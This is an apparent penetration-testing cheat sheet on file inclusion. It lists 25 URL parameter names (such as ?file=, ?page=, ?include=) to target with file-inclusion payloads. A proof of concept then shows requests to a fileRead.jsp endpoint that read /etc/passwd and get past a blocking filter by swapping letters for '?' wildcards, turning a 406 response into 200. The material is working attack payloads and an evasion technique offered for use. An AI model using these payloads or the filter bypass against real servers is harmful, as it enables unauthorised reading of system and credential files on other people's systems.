# File Inclusion

## File Inclusion Parameters

1. ?cat={payload}
2. ?dir={payload}
3. ?action={payload}
4. ?board={payload}
5. ?date={payload}
6. ?detail={payload}
7. ?file={payload}
8. ?download={payload}
9. ?path={payload}
10. ?folder={payload}
11. ?prefix={payload}
12. ?include={payload}
13. ?page={payload}
14. ?inc={payload}
15. ?locate={payload}
16. ?show={payload}
17. ?doc={payload}
18. ?site={payload}
19. ?type={payload}
20. ?view={payload}
21. ?content={payload}
22. ?document={payload}
23. ?layout={payload}
24. ?mod={payload}
25. ?conf={payload}



## LFI workaround PoC

LFI via this path does not work at first&#x20;

&#x20;`/fileRead.jsp?fileName=/etc/passwd (406)`&#x20;

But after replacing character with ? you may receive a successful response (200)

`/fileRead.jsp?fileName=/?tc/?asswd (200)`

`fileRead.jsp?fileName=/??c/??sswd (200)`
